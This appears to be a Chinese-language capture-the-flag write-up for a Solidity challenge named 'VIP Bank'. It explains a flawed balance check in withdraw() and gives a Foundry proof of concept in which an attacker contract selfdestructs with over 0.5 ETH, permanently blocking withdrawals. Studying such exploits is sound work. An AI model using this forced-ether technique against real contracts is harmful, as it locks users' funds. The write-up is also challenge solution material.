## VIP Bank

目标:

- 将 VIP 用户余额永久锁定在合约中

`withdraw` 方法中

```sol
function withdraw(uint _amount) public onlyVIP {
    require(
        address(this).balance <= maxETH,
        "Cannot withdraw more than 0.5 ETH per transaction"
    );
    ...
}
```

要求合约的余额要小于 `maxETH`, 即 `0.5 E`, 所以只要往合约内存入大于 `0.5 E` 的金额就能保证 `withdraw` 不可被调用

### POC

```solidity
contract VIPBankTest is Test {
    VIPBank public vipBank;
    VIPBankAttacker public attacker;
    address public deployer;
    address public vip;

    function setUp() public {
        deployer = vm.addr(1);
        vip = vm.addr(2);

        vm.startPrank(deployer);
        vm.deal(deployer, 1 ether);

        vipBank = new VIPBank();
        attacker = new VIPBankAttacker{value: 0.51 ether}(
            payable(address(vipBank))
        );

        vm.stopPrank();
    }

    function testFail_WithDraw() public {
        vm.startPrank(deployer);
        vipBank.addVIP(vip);
        vm.stopPrank();

        vm.startPrank(vip);
        vipBank.deposit{value: 0.01 ether}();

        vipBank.withdraw(0.01 ether);
        vm.stopPrank();
    }
}

contract VIPBankAttacker {
    constructor(address payable targetAddr) payable {
        require(msg.value > 0.5 ether, "need more than 0.5 ether to attack");
        selfdestruct(targetAddr);
    }
}

```
